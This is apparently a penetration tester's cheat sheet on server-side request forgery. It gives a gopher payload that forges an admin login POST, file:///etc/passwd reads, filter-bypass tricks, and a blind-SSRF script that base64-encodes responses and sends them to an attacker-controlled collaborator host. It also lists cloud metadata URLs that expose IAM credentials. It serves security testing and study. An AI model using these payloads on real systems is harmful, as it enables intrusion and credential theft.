# Server-Side Request Forgery (SSRF)

An SSRF vulnerability allows an attacker to make requests originating from the web server

| **Exploitation** |                                                                                                                                                                                                      |
| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                  | internal portscan by accessing ports on localhost                                                                                                                                                    |
|                  | accessing restricted endpoints                                                                                                                                                                       |
| **Protocols**    |                                                                                                                                                                                                      |
|                  | `http://127.0.0.1/`                                                                                                                                                                                  |
|                  | `file:///etc/passwd`                                                                                                                                                                                 |
|                  | `gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin` |

## Checks

- [ ] Look for anything that takes a URL input or fetches a resource (e.g., screenshot utility, pdf generator, etc.)
- [ ] If 127.0.0.1 or localhost aren't working, try variations to see if poor filtering rules are being used
  - Also make note of any internal IP addresses disclosed throughout the application. Try those to see if you can access resources on those hosts.
- [ ] Check to see if the server can communicate with any other servers on the internal network
- [ ] Try to get an external interaction to a server we control. Collaborator, interactsh, etc.

![file-20260214151101822](attachments/ssrf/file-20260214151101822.png)

- [ ] Try other URI schemes, `file://`, etc.
- [ ] Try looking for common images like `favicon.ico`
  - Check the location of the image on the server

> [!tip] Make sure the request is coming from the server and not your browser before reporting.

## Bypasses

| **Mitigation**                                      | **Bypass**                                                                                                       |
| --------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| Whitelisting                                        | Look for an open redirect                                                                                        |
| Blacklisting                                        | Create a custom CNAME and point it to the internal IP address of the target<br><br>Check for poor regex handling |
| Restricted content-types, characters, or extensions | Fuzzing or finding a bypass (encoding, other)                                                                    |
| No response                                         | JavaScript XHR request                                                                                           |

### Bypassing blacklists

- [ ] Try different ways of entering IP addresses. e.g., 127.1 instead of 127.0.0.1
  - Also try different encodings
- [ ] Point a custom subdomain to 127.0.0.1 and use that
  - localhost.tomfieber.dev -> 127.0.0.1
- [ ] Use [nip.io](http://nip.io/)
  - [127.0.0.1.nip.io](http://127.0.0.1.nip.io/) -> 127.0.0.1

### Bypassing whitelists

- [ ] Try to figure out how the filter is working
  - Can we append a domain we own? e.g., `victim.com.hacker.com`
  - Or `hackervictim.com`
  - etc.
- [ ] Chaining an open redirect
  - If we can find an open redirect in another part of the application, we can use **THAT** URL with the SSRF to redirect to our desired site. `https://teal.ctfio.com/?redirect=https://YOUR-OAST-PAYLOAD`
- [ ] Chaining HTML injection/XSS
  - Try something like `<script>document.write(document.location)</script>`
  - `<script>window.location="file:///etc/passwd"</script.`

### Blind SSRF

Example exploit script

```jsx
<script>
    exfil = new XMLHttpRequest();
    // Set the correct server below e.g https://abcdefg.ctfio.com
    exfil.open("GET","{server}/blind/recipe");
    exfil.send();
    // put your colab instance below to you can capture the contents of /blind/recipe
    exfil.onload = function(){ document.write('<img src="{colab_instance}}/?x=' + btoa(this.responseText) + '">'); }
</script>
```

## References

- [PortSwigger URL Validation Bypass Cheatsheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

## Cloud Metadata Endpoints

> [!tip] These are high-value SSRF targets. If you can hit them, you may get credentials, tokens, or instance info.

### AWS (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/user-data
```

> [!warning] IMDSv2 requires a PUT request with a hop-limit header to get a token first. SSRF that only allows GET requests won't work against IMDSv2.

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
```

Requires header: `Metadata-Flavor: Google`

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Requires header: `Metadata: true`

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```

## DNS Rebinding

Useful when the application validates the resolved IP on first request but uses a different resolution on the actual fetch.

- [ ] Use a DNS rebinding service (e.g., [rbndr.us](https://lock.cmpxchg8b.com/rebinder.html)) to alternate between a public IP and `127.0.0.1`
- [ ] Race condition: first DNS lookup passes the whitelist check, second resolves to internal IP

## Common URI Schemes

| Scheme                 | Usage                              |
| ---------------------- | ---------------------------------- |
| `http://` / `https://` | Standard web requests              |
| `file:///`             | Read local files                   |
| `dict://`              | DICT protocol (enumerate services) |
| `gopher://`            | Craft arbitrary TCP packets        |
| `ftp://`               | FTP requests                       |
| `sftp://`              | SFTP connections                   |
| `ldap://`              | LDAP queries                       |
| `tftp://`              | TFTP requests                      |
